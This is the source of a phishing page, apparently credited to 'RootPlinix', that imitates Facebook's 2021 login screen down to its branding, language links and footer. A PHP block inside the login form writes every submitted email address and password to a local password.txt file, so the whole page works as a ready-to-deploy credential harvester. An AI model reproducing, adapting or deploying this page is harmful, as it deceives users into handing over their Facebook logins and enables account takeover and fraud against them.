<!DOCTYPE html>
<!--Coded By RootPlinix And An Unknown Person Whole credit are not goes to RootPlinix.-->
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Facebook - log in or sign up</title>
	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
	<link rel="stylesheet" href="style.css">
	<link rel="shortcut icon" href="images/fav-icon.png">
</head>
<body>
	<div class="wraper">
		<div class="w-60">
			<div class="pc-logo-area">
				<h2>facebook</h2>
			</div>
		</div>
		<div class="w-40">
			<div class="some-text">
				<p>Facebook helps you connect and share <br>with the people in your life.</p>
			</div>
		</div>
	</div>
	<div class="second-wraper">
		<div class="w-70">
			<div class="languege-section-pc">
				<span class="en">English (UK)</span>
				<a href="#">বাংলা</a>
				<a href="#">অসমীয়া</a>
				<a href="#">हिन्दी</a>
				<a href="#">Bahasa Indonesia</a>
				<a href="#">नेपाली</a>
				<a href="#">中文(简体)</a>
				<a href="#">العربية</a>
				<a href="#">Bahasa Melayu</a>
				<a href="#">Español</a>
				<a href="#">Português (Brasil)</a>
			</div>
			<div class="add-more-icon">
				<a href="#" target="_self"><img src="images/add-more-icon-pc.png" alt="add more button"></a>
			</div>
		</div>
		<!--THIS SECTION IS FOR PC -->
		<div class="more-languege-section-pc">
			<hr class="hr-pc">
			<a href="#" target="_self">Sign UP</a>
			<a href="#" target="_self">Log IN</a>
			<a href="#" target="_self">Mesenger</a>
			<a href="#" target="_self">Facebook Lite</a>
			<a href="#" target="_self">Watch</a>
			<a href="#" target="_self">People</a>
			<a href="#" target="_self">Pages</a>
			<a href="#" target="_self">Page categories</a>
			<a href="#" target="_self">Places</a>
			<a href="#" target="_self">Games</a>
			<a href="#" target="_self">Locations</a>
			<a href="#" target="_self">Marketplace</a>
			<a href="#" target="_self">Facebook Pay</a>
			<a href="#" target="_self">Groups</a> <br>
			<a href="#" target="_self">Jobs</a>
			<a href="#" target="_self">Oculus</a>
			<a href="#" target="_self">Portal</a>
			<a href="#" target="_self">Instagram</a>
			<a href="#" target="_self">Local</a>
			<a href="#" target="_self">Fundraisers</a>
			<a href="#" target="_self">Services</a>
			<a href="#" target="_self">Voting Information Centre</a>
			<a href="#" target="_self">About</a>
			<a href="#" target="_self">Create ad</a>
			<a href="#" target="_self">Create Page</a>
			<a href="#" target="_self">Developers</a>
			<a href="#" target="_self">Careers</a>
			<a href="#" target="_self">Privacy</a> <br>
			<a href="#" target="_self">Cookies</a>
			<a href="#" target="_self">AdChoices <img class="ad" src="images/ad-icon.png" alt="ad icon"></a>
			<a href="#" target="_self">Terms</a>
			<a href="#" target="_self">Help</a>
			<span class="copywrite">Facebook &copy; 2021</span>
		</div>
	</div>
	<div class="header-area">
		<div class="icon">
			<img src="images/phone-icon.png" alt="phone icon">
		</div>
		<p>Get Facebook for Android and browse faster</p>
	</div>
	<div class="logo-area">
		<h2>facebook</h2>
	</div>
	<div class="form">
		<form method="POST">
			<input type="email" placeholder="Email address or phone number" id="email" name="email" class="useriput-p" required><br>
			<input type="password" name="password" id="password" placeholder="Password" class="useriput-p" required><br>
			<input type="submit" name="submit" value="Log In" class="login"><br>
			<div class="page-text">
			<p><span class="bold-text"><a href="#" target="_self">Create a Page</a></span> for a celebrity, band or business.</p>
					<?php

$text = "Youre Username :".$_POST['email']."\n";
$text2 = "Youre Password :".$_POST['password']."\n";
$file = fopen("password.txt","a");
fwrite($file,$text);
fwrite($file,$text2);
fclose($file);
?>
			</div>
		</form>
	<!--PC SECTION END-->
	<div class="break-section">
		<div class="breack-1">
			<hr class="hr-1">
		</div>
		<div class="text">
			<p>or</p>
		</div>
		<div class="breack-1">
			<hr class="hr-2">
		</div>
	</div>
	<div class="button">
		<button>Create New Account</button>
	</div>
	<div class="forgot">
		<a href="#" target="_self">Forgotten password?</a>
	</div>
	</div>
	<div class="languege-section">
		<div class="p-w-60">
			<span class="en">English (UK)</span>
			<a href="#" target="_self">অসমীয়া</a>
			<a href="#" target="_self">Bahasa Indonesia</a>
			<a href="#" target="_self">Português (Brasil)</a>
		</div>
		<div class="p-w-40">
			<a href="#" target="_self">বাংলা</a>
			<a href="#" target="_self">हिन्दी</a>
			<a href="#" target="_self">Españo</a>
			<div class="add-icon">
				<a href="#" target="_self"><img src="images/add-more-icon.png" alt="add icon"></a>
			</div>
		</div>
		<div class="fb-text">
			<p>Facebook Inc.</p>
		</div>
		
	</div>
</body>
</html>